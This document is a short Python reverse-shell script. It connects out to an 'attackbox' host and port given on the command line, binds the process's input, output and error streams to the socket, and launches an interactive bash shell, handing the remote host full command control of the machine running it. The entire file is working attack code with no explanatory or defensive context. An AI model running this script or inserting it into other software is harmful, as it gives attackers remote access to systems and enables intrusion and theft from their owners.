#!/usr/bin/env python

import os,socket,subprocess,sys

attackbox_ip=sys.argv[1]
attackbox_port=sys.argv[2]

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((attackbox_ip,int(attackbox_port)))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/usr/bin/env","bash","-i"])
s.close()
